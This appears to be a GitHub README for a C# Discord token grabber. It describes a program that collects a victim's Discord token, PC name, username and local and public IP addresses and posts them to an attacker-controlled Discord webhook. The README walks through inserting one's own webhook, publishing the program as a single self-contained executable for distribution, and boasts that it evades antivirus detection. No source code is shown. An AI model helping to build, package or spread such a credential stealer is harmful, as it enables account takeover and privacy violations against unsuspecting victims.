# LOL I FORGOT TO REMOVE MY OWN WEBHOOK whoever sent @everyone you failed, its a priv server lol



# Discord-Token-Grabber
Sends embed to discord webhook containing Discord token, PC Name, Username, Local ip and public ip.


# How to use?
Clone this repo and inside PrintAllInfo.cs you should see a url string, replace the url with your own discord webhook (not the double quotes)
you can publish as onefile and when ran, it will send an embed containing users details.


# Bypassing?
Ran program in virustotal, bypassed every single antivirus "No security vendors and no sandboxes flagged this file as malicious
" Windows defender warning will popup (if you're on windows) while trying to run, but thats about it.

# Flexibility?
May fail, only tested on windows. has dependencies, but if you publish as onefile it will do fine.


# About
Spent 3/4 of time fixing a Bad Webrequest 400 issue, couldn't filter all possible tokens, feel really stupid now because i just used a foreach loop and it worked 💀
Not very well tested, only ran on two pcs. Hopefully it works 🙂

# I Published it as a single file, but its WAY too big.
(Visual Studio Only)
Right click the .csproj file, click publish, click folder, click next, click folder, then next, specify your path where you the file, click finish. Then you should see some light blue text saying "Show all settings" click it, in Deployment mode, select Self contained, and in target runtime select whatever bit you're targeting, then click on File publish options and select Produce single file, Enable Ready To Run Compilation and trim unused code. When published this should decrease the size drastically (75%). 👍



Skidded some code from another outdated token grabber that throws errors.
